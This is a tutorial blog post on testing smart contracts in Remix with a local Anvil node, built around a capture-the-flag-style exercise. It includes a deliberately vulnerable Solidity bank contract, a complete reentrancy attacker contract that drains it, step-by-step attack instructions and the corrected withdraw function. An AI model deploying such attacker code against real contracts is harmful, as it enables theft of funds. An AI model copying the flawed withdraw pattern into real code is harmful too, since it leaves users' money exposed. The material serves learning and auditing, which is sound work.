---
title: "Smart Contract Testing in Remix"
date: 2025-06-25T10:00:00+01:00
---

Several months ago, I started to get interested in smart contract auditing and my first challenge was to be able to easily test PoCs and ideas, and when you're just starting out, it's frankly not that easy, because the tools aren't the most intuitive and for the most part CLI only.

Luckily, Remix IDE, although intimidating, offers everything I need

In this article, we'll explore how to effectively use Remix to test smart contracts, with an example of an exercise vulnerable to a reeantrancy.

## Understanding the Testing Environment Options in Remix

Once you've compiled your smart contract, you can use Remix to deploy it in different environments, the most used for testing being

**1. Remix VM (formerly JavaScript VM)**

The Remix VM is an in-browser blockchain simulation that allows for immediate testing without external connections. While convenient, it has limitations:

- No persistence between browser sessions
- Sometimes experiences bugs with complex contracts
- Limited to in-browser functionality
- Transactions process "instantly", which may not reflect real network behavior

**2. Injected Provider (Metamask)**

This connects Remix to your Metamask wallet, allowing you to test on any network Metamask supports:

- Real testnets like Sepolia or Goerli
- Actual gas costs and network conditions
- Requires test ETH and real transaction times
- Perfect for final testing before mainnet deployment

**3. Dev Mode (Foundry Provider)**

Perhaps the most powerful option for development combines the speed of local testing with realistic blockchain behavior:

- Connects to a local Anvil instance
- Near-instant transaction processing
- Persistence during development session
- Advanced debugging capabilities

## What is Anvil?

Anvil is Foundry's local Ethereum node implementation, designed specifically for development and testing. Think of it as a local blockchain running on your machine with these advantages:

- Configurable blockchain parameters (block time, gas limits, etc.)
- Pre-funded development accounts with test ETH
- The ability to fork any existing network for realistic testing
- Extremely low latency for rapid testing cycles
- Support for advanced testing scenarios

## Testing a Vulnerable Contract for Reentrancy Attacks

Let's examine our example contracts: `SplitBank` and `SplitBankAttacker`. These demonstrate a classic reentrancy vulnerability.

The exercise has the following description :
> You've deposited funds, but the owner is taking a large share. Can you find a way to get your money back?

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

contract SplitBank {
    mapping(address => uint256) public balances;
    address[] public depositors;
    address public ownerAccount;

    constructor() {
        ownerAccount = 0x1234567890123456789012345678901234567890;
    }

    /**
     * @notice Deposit ETH into the contract
     * @dev 10% of the deposit goes to the sender's internal balance, 90% to the owner
     */
    function deposit() external payable {
        require(msg.value >= 0.001 ether, "Must send at least 0.001 ETH");

        uint256 senderShare = (msg.value * 10) / 100;
        uint256 ownerShare = msg.value - senderShare;

        balances[msg.sender] += senderShare;
        balances[ownerAccount] += ownerShare;

        depositors.push(msg.sender);
    }

    /**
     * @notice Withdraw your full balance from the contract
     */
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        // require(amount > 0, "No balance");

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }

    /**
     * @notice Get the total ETH held by the contract
     */
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @notice Get the balance associated with a given address
     * @param addr The address to query
     */
    function getBalance(address addr) external view returns (uint256) {
        return balances[addr];
    }

    /*
     * @notice Get the number of depositors
     */
    function getDepositorCount() external view returns (uint256) {
        return depositors.length;
    }
}
```

### The Vulnerability Explained

Our `SplitBank` contract has a critical flaw in its `withdraw()` function:

```solidity
function withdraw() external {
    uint256 amount = balances[msg.sender];
    // require(amount > 0, "No balance");

    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");

    balances[msg.sender] = 0;
}
```

Notice two issues:
1. The commented out balance check (`// require(amount > 0, "No balance")`)
2. The state change (`balances[msg.sender] = 0`) occurs *after* the ETH transfer

This "checks-effects-interactions" pattern violation allows an attacker to re-enter the function before the balance is updated.

## Setting Up the Test Environment in Remix

Let's walk through testing these contracts using Remix with Anvil as our provider:

### Step 1: Start a Local Anvil Instance

Open a terminal and run:

```bash
anvil
```

This starts a local Ethereum node with pre-funded accounts. You'll see output showing available accounts and their private keys.

### Step 2: Configure Remix to Use Anvil

In Remix:
1. Click the "Deploy & Run Transactions" tab
2. In the "Environment" dropdown, select "Dev - Foundry Provider"
3. Remix will attempt to connect to the Anvil instance on the default port (8545)
4. You should see the list of Anvil accounts appear in the "Account" dropdown

### Step 3: Deploy the Vulnerable Contract

1. Compile the `SplitBank` contract
2. Deploy it using the Deploy button
3. Note the deployed contract's address

### Step 4: Deploy the Attacker Contract

1. Compile the `SplitBankAttacker` contract
2. When deploying, provide the address of the vulnerable `SplitBank` contract as a constructor parameter
3. This creates an attacker instance targeting our vulnerable contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

interface ISplitBank {
    function deposit() external payable;
    function withdraw() external;
}

contract SplitBankAttacker {
    ISplitBank victim;
    bool private attacking = false;

    constructor(ISplitBank _victim) {
        // Store a reference to the vulnerable contract
        victim = _victim;
    }

    /**
     * @notice Forward deposit to the vulnerable contract
     */
    function deposit() public payable {
        victim.deposit{value: msg.value}();
    }

    /**
     * @notice Receive function triggered when contract receives ETH
     * @dev If victim contract still has ETH, re-enter withdraw to drain more funds
     */
    receive() external payable {
        if (address(victim).balance >= 0.001 ether) {
            victim.withdraw();
        }
    }

    /**
     * @notice Start the attack by depositing and immediately withdrawing
     */
    function attack() public payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }
}
```

### Step 5: Execute the Attack

2. Send a small amount of ETH (0.01 ETH) to the attacker contract using its `deposit` function
3. Execute the `attack()` function with 0.01 ETH too as value
4. Monitor the `SplitBank` contract's balance using `getContractBalance()`

## Analyzing the Results

After the attack, you'll observe:

1. The `SplitBank` contract's balance is now 0
2. The attacker succeeds in recovering all his funds
3. The chain of events shows multiple withdrawals occurring in a single transaction

The attack succeeds because when `SplitBank` sends ETH to the attacker contract, the attacker's `receive()` function triggers, which calls `withdraw()` again before the first call completes, creating a loop that drains funds.

## Fixing the Vulnerability

To fix this vulnerability, implement the checks-effects-interactions pattern:

```solidity
function withdraw() external {
    uint256 amount = balances[msg.sender];
    require(amount > 0, "No balance");

    // Update state before external interaction
    balances[msg.sender] = 0;

    // Perform external interaction last
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

## The Advantages of Anvil for Testing

Testing with Anvil through Remix's Dev mode offers several advantages:

1. **Speed**: Transactions confirm instantly, allowing rapid testing cycles
2. **Realistic Environment**: Full EVM compatibility means your tests reflect actual blockchain behavior
3. **Debugging**: Better error messages and stack traces than Remix VM
4. **Persistence**: Your contract state persists until you restart Anvil
5. **No Costs**: Unlike testnets, you don't need to acquire test ETH

## Conclusion

Remix combined with Anvil creates a powerful environment for testing smart contracts, particularly for identifying security vulnerabilities like reentrancy attacks. The Dev mode (Foundry Provider) option bridges the gap between convenience and realism, making it an ideal choice for thorough contract testing before moving to public testnets.

By understanding the deployment options available and leveraging tools like Anvil, you can create a more efficient and effective testing workflow for your smart contract development/audit process.

And if you'd like to try out the exercise, it's available on [Hack The Chain](https://hackthechain.xyz)
